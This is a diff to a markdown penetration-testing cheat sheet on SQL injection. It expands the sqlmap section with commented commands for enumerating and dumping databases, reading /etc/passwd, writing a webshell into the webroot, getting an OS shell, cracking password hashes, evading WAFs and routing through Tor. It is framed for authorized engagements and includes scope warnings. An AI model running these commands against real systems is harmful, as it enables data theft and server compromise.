@@ -14,7 +14,17 @@ Injecting into a SQL query so the DB runs your input as code. Scope: authorized 
 - [Authentication bypass](#authentication-bypass)
 - [DBMS cheat columns](#dbms-cheat-columns)
 - [SQLi → file read/write & RCE](#sqli--file-readwrite--rce)
-- [sqlmap — commented command list](#sqlmap--commented-command-list)
+- [sqlmap — automation & extraction](#sqlmap--automation--extraction)
+  - [The extraction ladder](#the-extraction-ladder)
+  - [Detection & feeding a request](#detection--feeding-a-request)
+  - [Scan depth — level and risk](#scan-depth--level-and-risk)
+  - [Verbosity](#verbosity)
+  - [Hands-off automation](#hands-off-automation)
+  - [Enumerate — list all the tables](#enumerate--list-all-the-tables)
+  - [Dump — pull data from specific tables](#dump--pull-data-from-specific-tables)
+  - [Where the dumped data lands](#where-the-dumped-data-lands)
+  - [Post-exploitation (needs privileges; confirm scope first)](#post-exploitation-needs-privileges-confirm-scope-first)
+  - [WAF evasion & plumbing](#waf-evasion--plumbing)
 - [WAF / filter bypass tips & tricks](#waf--filter-bypass-tips--tricks)
 - [Defense / detection (for the report)](#defense--detection-for-the-report)
 
@@ -134,7 +144,7 @@ admin' #
 | Version | `@@version` / `version()` | `@@version` | `version()` | `banner FROM v$version` |
 | Current DB | `database()` | `db_name()` | `current_database()` | `SELECT user FROM dual` |
 | Comment | `-- -`, `#`, `/**/` | `--`, `/**/` | `--`, `/**/` | `--`, `/**/` |
-| Concat | `concat(a,b)` / `concat_ws` | `a+b` | `a||b` | `a||b` |
+| Concat | `concat(a,b)` / `concat_ws` | `a+b` | `a\|\|b` | `a\|\|b` |
 | Substring | `substring()` | `substring()` | `substring()` | `substr()` |
 | Sleep | `sleep(n)` | `waitfor delay '0:0:n'` | `pg_sleep(n)` | `dbms_pipe.receive_message` |
 | Stacked queries | ✗ (usually) | ✓ | ✓ | ✗ |
@@ -161,9 +171,33 @@ Only with the right privileges/config, and only if the engagement allows writing
 
 A webshell or `xp_cmdshell` turns SQLi into [RCE](RCE.md) — then grab a reverse shell and treat it as a normal host ([Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md)). Dumped password hashes go to [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) for cracking.
 
-## sqlmap — commented command list
+## sqlmap — automation & extraction
 
 Automates detection, exploitation and extraction. **Feed it a real request** (copy from Burp: *Copy to file*) so headers/cookies/method match exactly — far more reliable than flags.
+
+### The extraction ladder
+
+Work down it. Each rung needs the one above, and every rung is cheaper than the one below — on a blind injection each value costs many requests, so never dump before you know what you're dumping.
+
+| # | Goal | Command |
+| --- | --- | --- |
+| 1 | Confirm + fingerprint | `--banner --current-user --current-db --is-dba` |
+| 2 | Which databases exist | `--dbs` |
+| 3 | Which tables in one DB | `-D shopdb --tables` |
+| 4 | Which columns in one table | `-D shopdb -T users --columns` |
+| 5 | How big is it | `-D shopdb -T users --count` |
+| 6 | Pull the data | `-D shopdb -T users -C username,password --dump` |
+
+Two shortcuts past the ladder:
+
+```bash
+sqlmap -r request.txt --schema --exclude-sysdbs --batch   # every DB + table + column in one pass, no rows
+sqlmap -r request.txt --all --batch                       # "retrieve everything" — enumeration AND dumps, very noisy
+```
+
+`--schema` is the one to reach for: it maps the whole server's structure without touching a single row, so you can plan a scoped dump.
+
+### Detection & feeding a request
 
 ```bash
 # --- Basic detection ---
@@ -183,46 +217,203 @@ sqlmap -u "..." --cookie="SESSION=abc; role=user"                # authenticated
 sqlmap -u "..." --headers="X-Forwarded-For: 1*"                  # inject via a header (note the * marker)
 sqlmap -u "..." -H "Authorization: Bearer TOKEN"                 # single extra header
 sqlmap -u "..." --auth-type=basic --auth-cred="user:pass"        # HTTP Basic auth
+sqlmap -m targets.txt --batch                                    # -m = a file of in-scope URLs, one per line
+```
 
-# --- Tune the scan depth ---
-sqlmap -r request.txt --level=5 --risk=3            # level 1-5 = more params/places tested; risk 1-3 = heavier (OR/time) payloads
-sqlmap -r request.txt --dbms=mysql                  # skip fingerprinting; you already know the DBMS (faster, fewer requests)
-sqlmap -r request.txt --technique=BEUST            # restrict techniques: B=boolean E=error U=union S=stacked T=time Q=inline
-sqlmap -r request.txt --threads=10                  # parallel requests (speeds up blind extraction)
-sqlmap -r request.txt --random-agent                # rotate a real browser User-Agent (evade dumb UA filters)
+### Scan depth — level and risk
 
-# --- Enumeration (read-only, map the DB) ---
-sqlmap -r request.txt --banner                      # DB version banner
-sqlmap -r request.txt --current-user --current-db --is-dba   # who am I, which DB, am I admin
-sqlmap -r request.txt --dbs                         # list databases
-sqlmap -r request.txt -D shopdb --tables            # -D pick a database, list its tables
-sqlmap -r request.txt -D shopdb -T users --columns  # -T pick a table, list its columns
-sqlmap -r request.txt -D shopdb -T users --count    # row count before you dump (avoid huge dumps)
+The two knobs people get wrong. They are independent: **`--level` decides *how many places and payloads* get tested, `--risk` decides *how dangerous* the payloads are.** There is no `--severity` flag; these are the whole story.
 
-# --- Extraction ---
-sqlmap -r request.txt -D shopdb -T users -C username,password --dump   # -C = only these columns
-sqlmap -r request.txt -D shopdb -T users --dump                        # whole table
-sqlmap -r request.txt -D shopdb -T users --dump --where="id>0 AND id<50"  # bounded dump (scope-friendly)
-sqlmap -r request.txt --dump-all --exclude-sysdbs   # everything except system DBs (noisy — be sure of scope)
-sqlmap -r request.txt --search -C password          # find any column named like 'password' across the DB
+`--level` (1-5, default 1) — each level is cumulative:
 
-# --- Post-exploitation (needs privileges; confirm scope first) ---
+| Level | Adds |
+| --- | --- |
+| 1 | GET and POST parameters (always tested) |
+| 2 | HTTP **Cookie** header values |
+| 3 | HTTP **User-Agent** and **Referer** values |
+| 4 | More payloads/boundaries, no new locations |
+| 5 | HTTP **Host** header, plus the full payload set |
+
+`--risk` (1-3, default 1) — also cumulative:
+
+| Risk | Adds | Cost |
+| --- | --- | --- |
+| 1 | Payloads that are "innocuous for the majority of SQL injection points" | safe |
+| 2 | Heavy-query **time-based** tests | slow, can load the DB |
+| 3 | **`OR`-based** tests | ⚠️ see below |
+
+> ⚠️ **`--risk=3` can modify data.** An `OR`-based payload injected into an `UPDATE` or `DELETE` statement's `WHERE` clause matches *every row* — sqlmap's own docs call out "an update of all the entries of the table, which is certainly not what the attacker wants." On an authorized test against anything resembling production, get that in writing before you use risk 3, and prefer a read-only parameter.
+
+Escalate instead of starting at the top — `5/3` is roughly 50× the requests of `1/1` and much louder:
+
+```bash
+sqlmap -r request.txt --batch                                 # 1. default 1/1 — most injections fall here
+sqlmap -r request.txt --level=3 --risk=2 --batch               # 2. cookies + UA/Referer, heavy time-based
+sqlmap -r request.txt --level=5 --risk=3 --batch               # 3. last resort: Host header + OR payloads
+sqlmap -r request.txt --level=5 --risk=2 --batch               #    safer top end — all locations, no OR payloads
+```
+
+Pair a high level with narrowing flags so the extra depth doesn't cost you the whole afternoon:
+
+```bash
+sqlmap -r request.txt --level=5 --risk=2 -p id --dbms=mysql --technique=BT --batch
+#   -p         only this param (skips the other 40 the level would have tested)
+#   --dbms     skip fingerprinting, you already know
+#   --technique  B=boolean E=error U=union S=stacked T=time Q=inline — drop the ones that failed
+```
+
+### Verbosity
+
+Default is 1. The one worth remembering is **`-v 3`**, which prints the actual payloads:
+
+| `-v` | Shows |
+| --- | --- |
+| 0 | Tracebacks, errors and criticals only |
+| 1 | + information and warnings *(default)* |
+| 2 | + debug messages |
+| 3 | + **payloads injected** ← use this to learn, or to hand a reproducible payload to the report |
+| 4 | + HTTP requests |
+| 5 | + HTTP response headers |
+| 6 | + full response bodies |
+
+```bash
+sqlmap -r request.txt -v 3 --batch                  # see every payload as it's sent
+sqlmap -r request.txt --parse-errors                # surface the DBMS error text from responses
+sqlmap -r request.txt --eta                          # ETA per value — tells you if a blind dump is worth starting
+```
+
+### Hands-off automation
+
+```bash
+# The recon one-liner: spider the app, test every form it finds, never prompt
+sqlmap -u "https://target.tld/" --crawl=3 --forms --batch --smart \
+       --crawl-exclude="logout|signout|delete|admin/destroy" \
+       --random-agent --output-dir=./sqlmap-out
+#   --crawl=N         spider N links deep from the target URL
+#   --crawl-exclude   regex of pages to skip — ALWAYS exclude logout, or the crawler kills its own session
+#   --forms           parse and test <form> inputs found on the pages
+#   --smart           only run thorough tests where a heuristic already says "injectable" (big speedup when crawling)
+#   --batch           take the default answer to every prompt
+#   --output-dir      keep the run's artifacts with the engagement notes instead of in $HOME
+
+# Pre-answer specific prompts instead of blanket-defaulting
+sqlmap -r request.txt --answers="follow=N,crack=N,dict=N" --batch
+#   --batch alone will happily start cracking hashes or following redirects; --answers overrides those picks
+
+# Plumbing for long runs
+sqlmap -r request.txt --threads=10 --keep-alive --retries=3   # parallelism (helps blind extraction most)
+sqlmap -r request.txt --delay=1 --timeout=30 --time-sec=5     # back off; raise the time-based threshold on laggy targets
+```
+
+**Sessions resume by default.** sqlmap caches each target's findings in `session.sqlite`, so re-running picks up where it left off — that's why a second run looks instant. Two ways to override:
+
+```bash
+sqlmap -r request.txt --flush-session        # forget everything, re-detect from scratch (use after the app changes)
+sqlmap -r request.txt --fresh-queries        # keep the known injection, re-run the queries (use when data changed)
+```
+
+### Enumerate — list all the tables
+
+```bash
+sqlmap -r request.txt --dbs                           # all databases
+sqlmap -r request.txt --current-db                    # just the one the app uses (usually all you need)
+
+# --- all tables ---
+sqlmap -r request.txt -D shopdb --tables              # every table in ONE database
+sqlmap -r request.txt --tables                        # every table in EVERY database
+sqlmap -r request.txt --tables --exclude-sysdbs       # same, minus mysql/sys/information_schema/pg_catalog
+sqlmap -r request.txt -D shopdb --schema              # tables AND their columns, one database
+sqlmap -r request.txt --schema --exclude-sysdbs --batch   # the whole server's structure in one run
+
+# --- columns, then size ---
+sqlmap -r request.txt -D shopdb -T users --columns    # column names + types
+sqlmap -r request.txt -D shopdb --count               # row count of every table in the DB — read this BEFORE dumping
+sqlmap -r request.txt -D shopdb -T users --count      # row count of one table
+
+# --- find the table without listing everything (fastest on a big schema) ---
+sqlmap -r request.txt --search -T user                # tables whose NAME contains 'user'
+sqlmap -r request.txt --search -C pass                # columns whose NAME contains 'pass' (finds password columns anywhere)
+sqlmap -r request.txt --search -D prod                # databases
+```
+
+On a blind injection `--tables` across every database is hundreds of requests. Go `--current-db` → `--search -C pass` → dump the one table you actually wanted.
+
+### Dump — pull data from specific tables
+
+`-D` picks the database, `-T` the table(s), `-C` the column(s). Comma-separate, **no spaces**. The more you specify, the less you pull:
+
+```bash
+# --- one table ---
+sqlmap -r request.txt -D shopdb -T users --dump                        # whole table, all columns
+sqlmap -r request.txt -D shopdb -T users -C username,password --dump   # only these columns ← prefer this
+sqlmap -r request.txt -D shopdb -T users -C "username,password,email,is_admin" --dump
+
+# --- several specific tables in one run ---
+sqlmap -r request.txt -D shopdb -T users,orders,payments --dump        # comma-separated, no spaces
+
+# --- wider scopes (confirm scope first) ---
+sqlmap -r request.txt -D shopdb --dump                  # EVERY table in shopdb
+sqlmap -r request.txt --dump                            # every table in the CURRENT database — be explicit with -D instead
+sqlmap -r request.txt --dump-all --exclude-sysdbs       # every table in every DB, minus system DBs — very noisy
+sqlmap -r request.txt --dump-all                        # everything, system DBs included
+
+# --- bound the dump (scope-friendly, and how you prove impact without exfiltrating a customer table) ---
+sqlmap -r request.txt -D shopdb -T users --dump --where="id < 50"       # SQL WHERE applied to the dump
+sqlmap -r request.txt -D shopdb -T users --dump --start=1 --stop=20     # rows 1-20 only
+sqlmap -r request.txt -D shopdb -T users --dump --first=1 --last=8      # first 8 CHARACTERS of each value
+sqlmap -r request.txt -D shopdb -T users -C password --dump --stop=3    # three hashes is enough to prove it and to ID the format
+```
+
+`--start/--stop` count **rows**; `--first/--last` count **characters within each value**. `--first/--last` is the one to use on a slow blind injection — eight characters is plenty to identify a hash format or confirm a column holds real card data, at a fraction of the requests.
+
+Output format and encoding:
+
+```bash
+sqlmap -r request.txt -D shopdb -T users --dump --dump-format=CSV     # default; also HTML, SQLITE, JSONL
+sqlmap -r request.txt -D shopdb -T users --dump --hex                 # hex-encode in transit — fixes mangled UTF-8 / binary columns
+sqlmap -r request.txt -D shopdb -T users --dump --no-cast             # stop casting to string; try this if values come back NULL or truncated
+```
+
+### Where the dumped data lands
+
+sqlmap writes to an output directory per target and **prints the path when it finishes** — read that line rather than guessing. Recent versions use `~/.local/share/sqlmap/output/<target>/`, older ones `~/.sqlmap/output/<target>/`, and `--output-dir=./sqlmap-out` overrides both.
+
+```text
+<output-dir>/<target>/
+├── log              human-readable run log (what was found, which technique)
+├── session.sqlite   cached findings — delete this or use --flush-session to re-test
+├── target.txt       the target + the command line that produced this
+└── dump/
+    └── shopdb/
+        ├── users.csv
+        └── orders.csv
+```
+
+Point `--output-dir` at your engagement folder from the start. Dumped data is client data — it belongs with the evidence under the same handling rules as the rest of the report, not in `$HOME` on your laptop.
+
+### Post-exploitation (needs privileges; confirm scope first)
+
+```bash
 sqlmap -r request.txt --sql-shell                   # interactive SQL prompt through the injection
 sqlmap -r request.txt --sql-query="SELECT @@version" # run one query
 sqlmap -r request.txt --file-read=/etc/passwd       # read a server file (FILE priv)
 sqlmap -r request.txt --file-write=shell.php --file-dest=/var/www/html/s.php  # upload a file to the host
 sqlmap -r request.txt --os-shell                    # try to get an OS command shell (webroot write / xp_cmdshell / etc.)
 sqlmap -r request.txt --os-cmd="whoami"             # run a single OS command
+sqlmap -r request.txt --passwords                   # dump + offer to crack DBMS user password hashes
+sqlmap -r request.txt --privileges --roles          # what the DB user can do (justifies the severity rating)
+```
 
-# --- WAF evasion & plumbing ---
+### WAF evasion & plumbing
+
+```bash
 sqlmap -r request.txt --tamper=space2comment,between        # tamper scripts mutate payloads to dodge filters
 sqlmap --list-tampers                                        # see all tamper scripts and what they do
+sqlmap -r request.txt --identify-waf                         # fingerprint the WAF in front of the app
 sqlmap -r request.txt --proxy="http://127.0.0.1:8080"       # route through Burp to inspect traffic
 sqlmap -r request.txt --tor --tor-type=socks5 --check-tor   # anonymize via Tor
-sqlmap -r request.txt --delay=1 --time-sec=5                 # slow down; raise the time-based threshold on laggy targets
-sqlmap -u "https://target.tld/" --crawl=2 --forms --batch   # spider the site and auto-test discovered forms
-sqlmap -r request.txt --flush-session                        # forget cached results and re-test from scratch
-sqlmap -r request.txt -v 3                                   # verbosity 3 = show the actual payloads being sent
+sqlmap -r request.txt --random-agent                         # rotate a real browser User-Agent
+sqlmap -r request.txt --csrf-token=csrf --csrf-url=/form    # re-fetch and replay a CSRF token each request
 ```
 
 **Common tamper scripts:** `space2comment` (spaces → `/**/`), `between` (`>` → `NOT BETWEEN`), `charencode`/`charunicodeencode` (URL/unicode-encode), `randomcase` (mixed case keywords), `apostrophemask`, `modsecurityversioned` (MySQL versioned comments `/*!...*/`). Chain several with commas.
